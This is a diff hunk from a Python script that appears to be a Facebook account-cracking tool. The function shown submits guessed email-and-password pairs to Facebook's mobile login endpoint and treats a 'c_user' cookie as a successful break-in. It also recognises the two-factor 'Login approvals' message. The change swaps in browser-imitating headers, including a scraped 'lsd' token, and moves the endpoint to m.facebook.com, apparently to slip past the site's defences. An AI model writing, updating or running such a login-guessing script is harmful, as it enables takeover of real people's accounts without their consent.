@@ -1691,24 +1691,24 @@ def freeq(uid,pwx,tl):
             "email": uid,
             "pass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             "login": "Log In"}
-            headers = {'authority':'x.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
+            headers = {
+            'Host': 'm.facebook.com',
+            'Connection': 'keep-alive',
+            'Content-Length': '1612',
+            'Origin': 'https://m.facebook.com',
+            'Viewport-Width': '360',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 HeyTapBrowser/45.7.5.9',
+            'X-Response-Format': 'JSONStream',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-ASBD-ID': '129477',
+            'DPR': '2',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Referer': 'https://m.facebook.com/',
+            'Accept-Language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://x.facebook.com/login/device-based/login/async/"
+            url = "https://m.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
